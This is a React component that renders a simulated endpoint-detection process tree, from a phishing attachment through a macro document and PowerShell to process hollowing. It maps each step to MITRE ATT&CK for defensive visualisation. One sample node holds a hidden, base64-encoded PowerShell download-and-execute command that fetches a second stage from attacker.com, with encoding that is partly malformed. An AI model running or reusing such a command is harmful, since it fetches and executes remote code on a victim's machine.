import React, { useState } from 'react';
import { GitBranch, ShieldAlert, CheckCircle2 } from 'lucide-react';

interface ProcessNode {
  pid: number;
  name: string;
  command: string;
  user: string;
  integrity: 'SYSTEM' | 'HIGH' | 'MEDIUM';
  status: 'SUSPICIOUS' | 'MALICIOUS' | 'ISOLATED' | 'BENIGN';
  mitre: string;
  depth: number;
  children?: ProcessNode[];
}

export const ProcessTreeThreatVisualizer: React.FC = () => {
  const [selectedPid, setSelectedPid] = useState<number>(4892);

  const processTree: ProcessNode = {
    pid: 1042,
    name: 'explorer.exe',
    command: 'C:\\Windows\\explorer.exe',
    user: 'CORP\\investigator',
    integrity: 'MEDIUM',
    status: 'BENIGN',
    mitre: 'Initial User Session',
    depth: 0,
    children: [
      {
        pid: 2210,
        name: 'OUTLOOK.EXE',
        command: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"',
        user: 'CORP\\investigator',
        integrity: 'MEDIUM',
        status: 'BENIGN',
        mitre: 'T1566.001 (Spearphishing Attachment)',
        depth: 1,
        children: [
          {
            pid: 3412,
            name: 'WINWORD.EXE',
            command: '"WINWORD.EXE" "C:\\Users\\investigator\\AppData\\Local\\Temp\\Invoice_0392.docm"',
            user: 'CORP\\investigator',
            integrity: 'MEDIUM',
            status: 'SUSPICIOUS',
            mitre: 'T1204.002 (Malicious File Execution)',
            depth: 2,
            children: [
              {
                pid: 4104,
                name: 'cmd.exe',
                command: 'cmd.exe /c powershell.exe -w hidden -enc SQBFAFgAKABO...',
                user: 'CORP\\investigator',
                integrity: 'MEDIUM',
                status: 'SUSPICIOUS',
                mitre: 'T1059.003 (Windows Command Shell)',
                depth: 3,
                children: [
                  {
                    pid: 4892,
                    name: 'powershell.exe',
                    command: 'powershell.exe -w hidden -enc SQBFAFgAKABOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL2F0dGFja2VyLmNvbS9zdGFnZTInKQ==',
                    user: 'CORP\\investigator',
                    integrity: 'MEDIUM',
                    status: 'MALICIOUS',
                    mitre: 'T1059.001 (PowerShell) · T1027 (Obfuscation)',
                    depth: 4,
                    children: [
                      {
                        pid: 5312,
                        name: 'whoami.exe',
                        command: 'whoami /priv /groups',
                        user: 'CORP\\investigator',
                        integrity: 'MEDIUM',
                        status: 'ISOLATED',
                        mitre: 'T1033 (System Owner/User Discovery)',
                        depth: 5
                      },
                      {
                        pid: 5920,
                        name: 'svchost.exe (Injected)',
                        command: 'svchost.exe -k netsvcs -p (Process Hollowing Target)',
                        user: 'NT AUTHORITY\\SYSTEM',
                        integrity: 'SYSTEM',
                        status: 'ISOLATED',
                        mitre: 'T1055.012 (Process Hollowing) · T1071 (C2)',
                        depth: 5
                      }
                    ]
                  }
                ]
              }
            ]
          }
        ]
      }
    ]
  };

  const flattenTree = (node: ProcessNode, list: ProcessNode[] = []): ProcessNode[] => {
    list.push(node);
    if (node.children) {
      node.children.forEach((c) => flattenTree(c, list));
    }
    return list;
  };

  const allProcesses = flattenTree(processTree);
  const currentProcess = allProcesses.find((p) => p.pid === selectedPid) || allProcesses[4];

  const renderNode = (node: ProcessNode) => {
    const isSelected = selectedPid === node.pid;
    const isMalicious = node.status === 'MALICIOUS' || node.status === 'ISOLATED';
    const isSuspicious = node.status === 'SUSPICIOUS';

    return (
      <div key={node.pid} style={{ marginLeft: `${node.depth * 20}px` }} className="my-1.5">
        <div
          onClick={() => setSelectedPid(node.pid)}
          className={`flex items-center justify-between p-2.5 rounded-lg border font-mono text-xs cursor-pointer transition-all ${
            isSelected
              ? 'bg-[#00ff88]/15 border-[#00ff88] text-white shadow-[0_0_12px_rgba(0,255,136,0.3)]'
              : 'bg-zinc-950/80 border-zinc-800/80 text-zinc-300 hover:border-zinc-700'
          }`}
        >
          <div className="flex items-center gap-2 truncate">
            <GitBranch
              size={14}
              className={
                isMalicious ? 'text-red-400' : isSuspicious ? 'text-amber-400' : 'text-zinc-500'
              }
            />
            <span className="font-bold text-zinc-200">{node.name}</span>
            <span className="text-zinc-500 text-[10px]">PID: {node.pid}</span>
          </div>

          <div className="flex items-center gap-2 shrink-0">
            <span
              className={`px-2 py-0.5 text-[9px] rounded font-bold uppercase ${
                node.status === 'MALICIOUS'
                  ? 'bg-red-500/20 text-red-400 border border-red-500/40'
                  : node.status === 'ISOLATED'
                  ? 'bg-purple-500/20 text-purple-400 border border-purple-500/40'
                  : node.status === 'SUSPICIOUS'
                  ? 'bg-amber-500/20 text-amber-400 border border-amber-500/40'
                  : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
              }`}
            >
              {node.status}
            </span>
          </div>
        </div>

        {node.children && node.children.map((child) => renderNode(child))}
      </div>
    );
  };

  return (
    <div className="w-full bg-[#080d0b] border border-[#1f2e26] rounded-xl overflow-hidden p-4 md:p-6 text-zinc-200 font-sans shadow-2xl">
      {/* Header */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between pb-4 border-b border-[#1c2a23] gap-3">
        <div>
          <div className="flex items-center gap-2">
            <ShieldAlert size={16} className="text-[#00ff88]" />
            <h3 className="font-mono text-sm md:text-base font-bold text-white tracking-wide">
              ADVERSARY PROCESS EXECUTION TREE & MITRE MAPPING
            </h3>
          </div>
          <p className="text-xs font-mono text-zinc-400 mt-0.5">
            Parent-child process lineage reconstruction mapping execution vectors from spearphishing to memory injection
          </p>
        </div>

        <div className="flex items-center gap-2 text-xs font-mono">
          <span className="px-2.5 py-1 rounded bg-red-500/10 text-red-400 border border-red-500/30 font-bold">
            EDR ALERT: THREAT QUARANTINED
          </span>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 my-6">
        {/* Left: Process Tree View */}
        <div className="lg:col-span-6 bg-[#040705] border border-[#14231b] rounded-lg p-3 overflow-y-auto max-h-[380px]">
          <div className="text-[10px] font-mono text-zinc-500 mb-2 px-1 uppercase tracking-wider">
            Process Execution Hierarchy (Click to inspect):
          </div>
          {renderNode(processTree)}
        </div>

        {/* Right: Selected Process Deep Triage */}
        <div className="lg:col-span-6 bg-[#040806] border border-[#14231b] rounded-lg p-4 font-mono text-xs space-y-4">
          <div className="flex items-center justify-between pb-3 border-b border-[#1c2a23]">
            <div>
              <span className="text-[#00ff88] text-[10px] font-bold uppercase block">
                PROCESS INSPECTOR · PID {currentProcess.pid}
              </span>
              <h4 className="text-base font-bold text-white mt-0.5">{currentProcess.name}</h4>
            </div>

            <span className="px-2 py-0.5 bg-zinc-900 border border-zinc-800 text-zinc-300 text-[10px]">
              INT: {currentProcess.integrity}
            </span>
          </div>

          <div className="space-y-1">
            <span className="text-zinc-500 text-[10px] uppercase block">Executed Command Line:</span>
            <pre className="p-3 rounded bg-zinc-950 border border-zinc-800 text-zinc-200 text-[11px] whitespace-pre-wrap break-all leading-tight">
              {currentProcess.command}
            </pre>
          </div>

          <div className="grid grid-cols-2 gap-3 text-[11px]">
            <div>
              <span className="text-zinc-500 block text-[10px] uppercase">User Context:</span>
              <span className="text-zinc-200">{currentProcess.user}</span>
            </div>
            <div>
              <span className="text-zinc-500 block text-[10px] uppercase">MITRE ATT&CK Mapping:</span>
              <span className="text-amber-400 font-bold">{currentProcess.mitre}</span>
            </div>
          </div>

          <div className="pt-2 border-t border-[#1c2a23] space-y-2">
            <span className="text-zinc-500 text-[10px] uppercase block">Detection & Quarantine Action:</span>
            <div className="p-2.5 rounded bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[11px] flex items-center gap-2">
              <CheckCircle2 size={14} className="shrink-0" />
              <span>CrowdStrike Falcon Sensor intercepted unauthorized subprocess creation and severed network socket.</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
